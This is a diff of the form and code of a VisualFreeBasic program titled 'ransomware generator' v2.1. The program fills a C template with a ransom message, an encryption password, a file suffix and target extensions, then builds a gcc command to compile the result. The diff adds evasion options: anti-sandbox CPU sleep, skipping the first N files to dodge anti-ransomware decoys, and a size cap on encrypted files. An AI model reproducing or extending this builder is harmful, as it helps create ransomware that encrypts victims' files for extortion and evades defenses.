@@ -1,4 +1,4 @@
-﻿#VisualFreeBasic_Form#  Version=5.4.6
+﻿#VisualFreeBasic_Form#  Version=5.4.10
 Locked=0
 
 [Form]
@@ -8,15 +8,15 @@ ClassName=WDS
 WinStyle=WS_THICKFRAME,WS_CAPTION,WS_SYSMENU,WS_MINIMIZEBOX,WS_MAXIMIZEBOX,WS_CLIPSIBLINGS,WS_CLIPCHILDREN,WS_VISIBLE,WS_EX_WINDOWEDGE,WS_EX_CONTROLPARENT,WS_EX_LEFT,WS_EX_LTRREADING,WS_EX_RIGHTSCROLLBAR,WS_POPUP,WS_SIZEBOX
 Style=3 - 常规窗口
 Icon=
-Caption=勒索病毒生成器 v2.0
+Caption=勒索病毒生成器 v2.1
 StartPosition=1 - 屏幕中心
 WindowState=0 - 正常
 Enabled=True
 Repeat=False
 Left=0
 Top=0
-Width=609
-Height=384
+Width=598
+Height=413
 TopMost=False
 Child=False
 MdiChild=False
@@ -45,6 +45,32 @@ ToolTip=右击查看帮助
 ToolTipBalloon=False
 AcceptFiles=False
 
+[CheckBox]
+Name=Set_5
+Index=-1
+Style=0 - 标准
+Caption=反勒索诱捕
+TextAlign=3 - 中左对齐
+Alignment=0 - 文本在左边
+Value=0 - 未选择
+Multiline=True
+Enabled=True
+Visible=True
+ForeColor=SYS,8
+BackColor=SYS,25
+Font=微软雅黑,9,0
+Left=24
+Top=73
+Width=112
+Height=24
+Layout=0 - 不锚定
+MousePointer=0 - 默认
+Tag=
+Tab=True
+ToolTip=
+ToolTipBalloon=False
+AcceptFiles=False
+
 [Frame]
 Name=Frame2
 Index=-1
@@ -61,7 +87,7 @@ Font=微软雅黑,9,0
 Left=157
 Top=4
 Width=421
-Height=208
+Height=232
 Layout=0 - 不锚定
 MousePointer=0 - 默认
 Tag=
@@ -82,10 +108,10 @@ Visible=True
 ForeColor=SYS,8
 BackColor=SYS,25
 Font=Tahoma,9,0
-Left=17
-Top=71
-Width=83
-Height=27
+Left=24
+Top=49
+Width=112
+Height=24
 Layout=0 - 不锚定
 MousePointer=0 - 默认
 Tag=
@@ -200,32 +226,6 @@ ToolTip=
 ToolTipBalloon=False
 LeftMargin=0
 RightMargin=0
-AcceptFiles=False
-
-[CheckBox]
-Name=Set_4
-Index=-1
-Style=0 - 标准
-Caption=upx压缩
-TextAlign=3 - 中左对齐
-Alignment=0 - 文本在左边
-Value=0 - 未选择
-Multiline=True
-Enabled=True
-Visible=True
-ForeColor=SYS,8
-BackColor=SYS,25
-Font=Tahoma,9,0
-Left=17
-Top=95
-Width=70
-Height=25
-Layout=0 - 不锚定
-MousePointer=0 - 默认
-Tag=
-Tab=True
-ToolTip=
-ToolTipBalloon=False
 AcceptFiles=False
 
 [Label]
@@ -344,11 +344,11 @@ Visible=True
 Default=False
 OwnDraw=False
 MultiLine=False
-Font=Tahoma,9,0
-Left=8
-Top=271
-Width=574
-Height=71
+Font=宋体,24,1
+Left=7
+Top=297
+Width=570
+Height=76
 Layout=0 - 不锚定
 MousePointer=0 - 默认
 Tag=
@@ -361,13 +361,13 @@ Name=SavePath
 Index=-1
 Style=3 - 凹边框
 TextScrollBars=0 - 无滚动条
-Text=生成病毒的路径
+Text=生成病毒源代码的路径
 Enabled=True
 Visible=True
 MaxLength=0
 ForeColor=SYS,8
 BackColor=SYS,5
-Font=Tahoma,9,0
+Font=Tahoma,12
 TextAlign=0 - 左对齐
 PasswordChar=
 Locked=False
@@ -378,10 +378,10 @@ Lowercase=False
 Number=False
 AutoHScroll=True
 AutoVScroll=False
-Left=10
-Top=227
+Left=9
+Top=238
 Width=565
-Height=36
+Height=55
 Layout=0 - 不锚定
 MousePointer=0 - 默认
 Tag=
@@ -406,36 +406,10 @@ Visible=True
 ForeColor=SYS,8
 BackColor=SYS,25
 Font=微软雅黑,9,0
-Left=17
-Top=49
-Width=79
-Height=21
-Layout=0 - 不锚定
-MousePointer=0 - 默认
-Tag=
-Tab=True
-ToolTip=
-ToolTipBalloon=False
-AcceptFiles=False
-
-[CheckBox]
-Name=Set_1
-Index=-1
-Style=0 - 标准
-Caption=倒序加密
-TextAlign=3 - 中左对齐
-Alignment=0 - 文本在左边
-Value=0 - 未选择
-Multiline=True
-Enabled=True
-Visible=True
-ForeColor=SYS,8
-BackColor=SYS,25
-Font=微软雅黑,9,0
-Left=16
-Top=28
-Width=105
-Height=17
+Left=23
+Top=27
+Width=112
+Height=24
 Layout=0 - 不锚定
 MousePointer=0 - 默认
 Tag=
@@ -457,41 +431,15 @@ BackColor=SYS,25
 Enabled=True
 Visible=True
 Font=微软雅黑,9,0
-Left=5
-Top=5
-Width=145
-Height=208
+Left=6
+Top=2
+Width=152
+Height=230
 Layout=0 - 不锚定
 MousePointer=0 - 默认
 Tag=
 ToolTip=
 ToolTipBalloon=False
-
-[CheckBox]
-Name=Set_5
-Index=-1
-Style=0 - 标准
-Caption=反勒索诱捕
-TextAlign=3 - 中左对齐
-Alignment=0 - 文本在左边
-Value=0 - 未选择
-Multiline=True
-Enabled=True
-Visible=True
-ForeColor=SYS,8
-BackColor=SYS,25
-Font=微软雅黑,9,0
-Left=17
-Top=117
-Width=112
-Height=24
-Layout=0 - 不锚定
-MousePointer=0 - 默认
-Tag=
-Tab=True
-ToolTip=
-ToolTipBalloon=False
-AcceptFiles=False
 
 [Option]
 Name=RC4
@@ -612,6 +560,227 @@ Tag=
 ToolTip=
 ToolTipBalloon=False
 
+[ComboBox]
+Name=Object_B
+Index=-1
+Style=0 - 标签和下拉框
+Custom=KB|0|<Sel>MB|0|GB|0
+OwnDraw=0 - 系统绘制
+ItemHeight=18
+HasString=False
+Sorted=True
+NoHeight=False
+AutoHscroll=True
+MaxLength=0
+Uppercase=False
+Lowercase=False
+Enabled=True
+Visible=True
+ForeColor=SYS,8
+BackColor=SYS,5
+Font=微软雅黑,12
+Left=307
+Top=202
+Width=124
+Height=3
+Layout=0 - 不锚定
+MousePointer=0 - 默认
+Tag=
+Tab=True
+ToolTip=
+ToolTipBalloon=False
+AcceptFiles=False
+
+[Label]
+Name=lx
+Index=-1
+Style=0 - 无边框
+Caption=超过
+Enabled=True
+Visible=True
+ForeColor=SYS,8
+BackColor=SYS,25
+Font=微软雅黑,9,0
+TextAlign=0 - 左对齐
+Prefix=True
+Ellipsis=False
+Left=167
+Top=210
+Width=62
+Height=15
+Layout=0 - 不锚定
+MousePointer=0 - 默认
+Tag=
+ToolTip=
+ToolTipBalloon=False
+
+[TextBox]
+Name=length
+Index=-1
+Style=3 - 凹边框
+TextScrollBars=0 - 无滚动条
+Text=
+Enabled=True
+Visible=True
+MaxLength=0
+ForeColor=SYS,8
+BackColor=SYS,5
+Font=微软雅黑,9,0
+TextAlign=0 - 左对齐
+PasswordChar=
+Locked=False
+HideSelection=True
+Multiline=False
+Uppercase=False
+Lowercase=False
+Number=True
+AutoHScroll=True
+AutoVScroll=False
+Left=201
+Top=207
+Width=97
+Height=23
+Layout=0 - 不锚定
+MousePointer=0 - 默认
+Tag=
+Tab=True
+ToolTip=
+ToolTipBalloon=False
+LeftMargin=0
+RightMargin=0
+AcceptFiles=False
+
+[Label]
+Name=Label5
+Index=-1
+Style=0 - 无边框
+Caption=时，放弃加密文件
+Enabled=True
+Visible=True
+ForeColor=SYS,8
+BackColor=SYS,25
+Font=微软雅黑,9,0
+TextAlign=0 - 左对齐
+Prefix=True
+Ellipsis=False
+Left=447
+Top=206
+Width=109
+Height=20
+Layout=0 - 不锚定
+MousePointer=0 - 默认
+Tag=
+ToolTip=
+ToolTipBalloon=False
+
+[TextBox]
+Name=TOBJ
+Index=-1
+Style=3 - 凹边框
+TextScrollBars=0 - 无滚动条
+Text=
+Enabled=True
+Visible=False
+MaxLength=0
+ForeColor=SYS,8
+BackColor=SYS,5
+Font=微软雅黑,9,0
+TextAlign=0 - 左对齐
+PasswordChar=
+Locked=False
+HideSelection=True
+Multiline=False
+Uppercase=False
+Lowercase=False
+Number=True
+AutoHScroll=True
+AutoVScroll=False
+Left=96
+Top=99
+Width=25
+Height=19
+Layout=0 - 不锚定
+MousePointer=0 - 默认
+Tag=
+Tab=True
+ToolTip=
+ToolTipBalloon=False
+LeftMargin=0
+RightMargin=0
+AcceptFiles=False
+
+[Label]
+Name=SSD
+Index=-1
+Style=0 - 无边框
+Caption=跳过搜索到的前       个文件
+Enabled=True
+Visible=False
+ForeColor=SYS,8
+BackColor=SYS,25
+Font=微软雅黑,9,0
+TextAlign=0 - 左对齐
+Prefix=True
+Ellipsis=False
+Left=9
+Top=99
+Width=149
+Height=22
+Layout=0 - 不锚定
+MousePointer=0 - 默认
+Tag=
+ToolTip=
+ToolTipBalloon=False
+
+[Label]
+Name=URL
+Index=-1
+Style=0 - 无边框
+Caption=开源地址
+Enabled=True
+Visible=True
+ForeColor=&HFFF58810
+BackColor=SYS,25
+Font=微软雅黑,9,0
+TextAlign=0 - 左对齐
+Prefix=True
+Ellipsis=False
+Left=32
+Top=208
+Width=99
+Height=14
+Layout=0 - 不锚定
+MousePointer=14 - 手型
+Tag=
+ToolTip=
+ToolTipBalloon=False
+
+[CheckBox]
+Name=Set_6
+Index=-1
+Style=0 - 标准
+Caption=反沙箱
+TextAlign=3 - 中左对齐
+Alignment=0 - 文本在左边
+Value=0 - 未选择
+Multiline=True
+Enabled=True
+Visible=True
+ForeColor=SYS,8
+BackColor=SYS,25
+Font=微软雅黑,9,0
+Left=26
+Top=121
+Width=69
+Height=12
+Layout=0 - 不锚定
+MousePointer=0 - 默认
+Tag=
+Tab=True
+ToolTip=
+ToolTipBalloon=False
+AcceptFiles=False
+
 
 [AllCode]
 '优化是标准的工程模版，你也可做自己的模版。
@@ -663,33 +832,24 @@ FUNCTION QC(BYVAL Sss as string)As STRING
    Sss = YF_Replace(Sss, "$tab$", vbtab)
    Sss = YF_Replace(Sss, "$cr$", vbCr)
    Sss = YF_Replace(Sss, "$builddate$", buliddate)
-   Sss = YF_Replace(Sss, "$author$", "znkzz")
+   Sss = YF_Replace(Sss ,"$author$" ,"znkzz")
+   Sss = YF_Replace(Sss ,"$random$" ,rdmstr)
+   
    Return sss
 End function
+Sub Q_BeginSave_BN_Clicked(hWndForm As hWnd ,hWndControl As hWnd)  '单击
+   if Len(CWSTRtoString(length.Text)) = 0 Then length.Text = "500"
+    if Len(CWSTRtoString(tobj.Text))=0 Then tobj.Text="500"
+   if InStr(SavePath.Text ,"""") Then
 
-Sub Q_Shown(hWndForm As hWnd, UserData As Integer)  '窗口完全显示后。UserData 来自显示窗口最后1个参数。
-   Q.Caption = ReadINI("App.Info", "Title")
-   Q.gcc.Text = ReadINI("App.Info", "gcc")
-   Q.Password.Text = ReadINI("App.Info", "Password")
-   Q.EncryptedSuffix.Text = ReadINI("App.Info", "EncryptedSuffix")
-   Q.PromptMessage.Text = ReadINI("App.Info", "PromptMessage")
-   Q.ohzm.Text = """" + ReadINI("App.Info", "ohzm") + """"
-   THEUPX = ReadINI("App.Info", "UPX") 
-   Q.SavePath.Text = ReadINI("Setting", "SavePath")
-   Q.RC4.value = cint(tt(ReadINI("Setting", "RC4"), 1))
-   Q.Xor_.value = cint(tt(ReadINI("Setting", "Xor"), 2))
-   Q.Set_1.value = cint(tt(ReadINI("Setting", "Setting.1"), 3))
-   Q.Set_2.value = cint(tt(ReadINI("Setting", "Setting.2"), 4))
-   Q.Set_3.value = cint(tt(ReadINI("Setting", "Setting.3"), 5))
-   Q.Set_4.value = cint(tt(ReadINI("Setting", "Setting.4"), 6))
-   Q.Set_5.value = cint(tt(ReadINI("Setting", "Setting.5"), 7))
-   CFILE1 = ReadINI("Setting", "CFILE1.Path")
-   CFILE2 = ReadINI("Setting", "CFILE2.Path")
-   Helpmsg = ReadINI("About", "help")
-   
-End Sub
-
-Sub Q_BeginSave_BN_Clicked(hWndForm As hWnd, hWndControl As hWnd)  '单击
+Select Case MsgBox( hWndForm,"清除原文本?", _
+            MB_YESNO Or MB_ICONQUESTION Or MB_DEFBUTTON1 Or MB_APPLMODAL)
+         Case IDYES
+            SavePath.Text = ""
+            return 
+    Case IDNO
+End Select
+   End If
    Dim ANTI AS BOOLEAN
    if Set_5.Value = true Then 
       ANTI = true
@@ -697,9 +857,6 @@ Sub Q_BeginSave_BN_Clicked(hWndForm As hWnd, hWndControl As hWnd)  '单击
    if len(dir(CWSTRtoString(gcc.Text))) = 0 Then
       MsgBox "Sorry,gcc not found.", 16
       q.BeginSave.Kill
-   End If
-   IF Set_5.Value = true Then
-      
    End If
    if Xor_.Value = true Then 
    open CFILE1 for input as #1
@@ -718,14 +875,31 @@ if len(Dir(Environ("temp") + "\\6.c")) <> 0 then
 DeleteFileA Environ("temp") + "\\6.c"
 End if
 if anti then
-   _data = YF_Replace( _data, "$antiyb$", "true")
-Else
-   _data = YF_Replace( _data, "$antiyb$", "false")
+   _data = YF_Replace( _data ,"$ANTI$" ,"#define _ANTI_")
+   _data = YF_Replace( _data ,"$count$" ,CWSTRtoString(TOBJ.TEXT))
+else
+   _data = YF_Replace( _data ,"$ANTI$" ,"")
+   _data = YF_Replace( _data ,"$count$" ,"0")
 End if
 _data = YF_Replace( _data, "$ntmsg$", ZC(CWSTRtoString(PromptMessage.text)))
 _data = YF_Replace( _data, "$pass_word$", ZC(CWSTRtoString(password.text)))
 _data = YF_Replace( _data, "$hzm$", ZC(CWSTRtoString(EncryptedSuffix.text)))
-_data = YF_Replace( _data, "$lists$", ZC(CWSTRtoString(ohzm.text)))
+_data = YF_Replace( _data ,"$lists$" ,CWSTRtoString(ohzm.text))
+   if Set_6.Value = true Then 
+      _data = YF_Replace( _data ,"$IsCPUSleep$" ,"#define CPUs")
+   Else
+       _data = YF_Replace( _data ,"$IsCPUSleep$" ,"")
+    end if
+if Object_B.ListIndex = 0 Then 
+_data = YF_Replace( _data ,"$length$" ,CWSTRtoString(LENGTH.text)+"*"+"GB")
+elseif Object_B.ListIndex = 2 Then 
+_data = YF_Replace( _data ,"$length$" ,CWSTRtoString(LENGTH.text)+"*"+"MB")
+elseif Object_B.GetTopIndex = 1 Then 
+   _data = YF_Replace( _data ,"$length$" ,CWSTRtoString(LENGTH.text) + "*" + "KB")
+else
+   _data = YF_Replace( _data ,"$length$" ,CWSTRtoString(LENGTH.text)+"*"+"MB")
+End If
+
 open Environ("temp") + "\\6.c" for output as #1
 print #1, _data
 close #1
@@ -738,10 +912,8 @@ if Set_3.Value = true Then
 End If
 
 SavePath.text=StringToCWSTR( CWSTRtoString(gcc.TEXT) +" -mwindows " + OP +" """+Environ("temp") + "\6.c"+""" -o """ + CWSTRtoString(SavePath.Text) + """" )
-shell CWSTRtoString(SavePath.text)
-if Set_4.value = true Then
- Shell theupx+" --force "+ CWSTRtoString(SavePath.Text) 
-End If
+MsgBox "已生成gcc命令行参数!" ,48
+
 End Sub
 
 Sub Q_WM_RButtonDown(hWndForm As hWnd, MouseFlags As Long, xPos As Long, yPos As Long)  '按下鼠标右键
@@ -814,20 +986,8 @@ Function Q_VEH1_VectExcepHandler(ByRef excp As EXCEPTION_POINTERS)As Integer  '�
    
 End Function
 
-Sub Q_Set_4_BN_Clicked(hWndForm As hWnd, hWndControl As hWnd)  '单击
-   
-End Sub
 
-Sub Q_gcc_EN_Change(hWndForm As hWnd, hWndControl As hWnd)  '文本已经被修改（修改前用 EN_UPDATE
-   
-End Sub
 
-Sub Q_Set_1_BN_Clicked(hWndForm As hWnd, hWndControl As hWnd)  '单击
-   if len(dir(CWSTRtoString(gcc.Text))) = 0 Then
-      MsgBox "Sorry,gcc not found.", 16
-      q.set_1.Kill
-   End If
-End Sub
 
 Sub Q_Set_2_BN_Clicked(hWndForm As hWnd, hWndControl As hWnd)  '单击
    if len(dir(CWSTRtoString(gcc.Text))) = 0 Then
@@ -852,23 +1012,95 @@ Function tt(DD As string, ttt as integer)as string
    if dd = "-1" And ttt = 2 Then
       Q.Xor_.Enabled = False
    End If
-   if dd = "-1" And ttt = 3 Then
-      Q.Set_1.Enabled = False
-   End If
    if dd = "-1" And ttt = 4 Then
       Q.Set_2.Enabled = False
    End If
    if dd = "-1" And ttt = 5 Then
       Q.Set_3.Enabled = False
    End If
-   if dd = "-1" And ttt = 6 Then
-      Q.Set_4.Enabled = False
-   End If
    if dd = "-1" And ttt = 7 Then
       Q.Set_5.Enabled = False
    End If
+   if dd = "-1" And ttt = 8 Then
+      Q.Set_6.Enabled = False
+   End If
    Return "0"
 End Function
+
+Sub Q_WM_Create(hWndForm As hWnd,UserData As Integer)  '完成创建窗口及所有的控件后，此时窗口还未显示。注：自定义消息里 WM_Create 此时还未创建控件和初始赋值。
+   if AfxFileLen("config.ini") = 0 Or AfxFileLen("config.ini") = 2 Then
+       DeleteFileA "config.ini"
+       MsgBox "Sorry,“config.ini” not found." + vbcrlf + "Please install again." ,16
+      End 
+   End If
+   Q.Caption = ReadINI("App.Info", "Title")
+   Q.gcc.Text = ReadINI("App.Info", "gcc")
+   Q.Password.Text = ReadINI("App.Info", "Password")
+   Q.EncryptedSuffix.Text = ReadINI("App.Info", "EncryptedSuffix")
+   Q.PromptMessage.Text = ReadINI("App.Info", "PromptMessage")
+   Q.ohzm.Text = """" + ReadINI("App.Info", "ohzm") + """"
+   Q.SavePath.Text = ReadINI("Setting", "SavePath")
+   Q.RC4.value = cint(tt(ReadINI("Setting", "RC4"), 1))
+   Q.Xor_.value = cint(tt(ReadINI("Setting", "Xor"), 2))
+   Q.Set_2.value = cint(tt(ReadINI("Setting", "Setting.2"), 4))
+   Q.Set_3.value = cint(tt(ReadINI("Setting", "Setting.3"), 5))
+   Q.Set_5.value = cint(tt(ReadINI("Setting" ,"Setting.5") ,7))
+   Q.Set_6.value = cint(tt(ReadINI("Setting" ,"Setting.6") ,8))
+   CFILE1 = ReadINI("Setting", "CFILE1.Path")
+   CFILE2 = ReadINI("Setting", "CFILE2.Path")
+   Helpmsg = ReadINI("About" ,"help")
+End Sub
+
+Sub Q_Set_5_BN_Clicked(hWndForm As hWnd, hWndControl As hWnd)  '单击
+   if Set_5.Value = True Then
+      SSD.Visible = True
+      TOBJ.Visible = True  
+   Else
+      SSD.Visible = False
+      TOBJ.Visible = false 
+     End if
+End Sub
+
+
+
+Sub Q_URL_WM_LButtonDown(hWndForm As hWnd, MouseFlags As Long, xPos As Long, yPos As Long)  '按下鼠标左键
+   'MouseFlags  MK_CONTROL   MK_LBUTTON     MK_MBUTTON     MK_RBUTTON    MK_SHIFT     MK_XBUTTON1       MK_XBUTTON2 
+   ''           CTRL键按下   鼠标左键按下   鼠标中键按下   鼠标右键按下  SHIFT键按下  第一个X按钮按下   第二个X按钮按下
+   '检查什么键按下用  If (MouseFlags And MK_CONTROL)<>0 Then CTRL键按下 
+OpenWWW(NULL,"https://github.com/znkzz/Ransomware-Maker")   
+End Sub
+
+Function rdmstr()As String
+   Randomize
+return str(Int(Rnd * 10000)+1)
+End Function
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
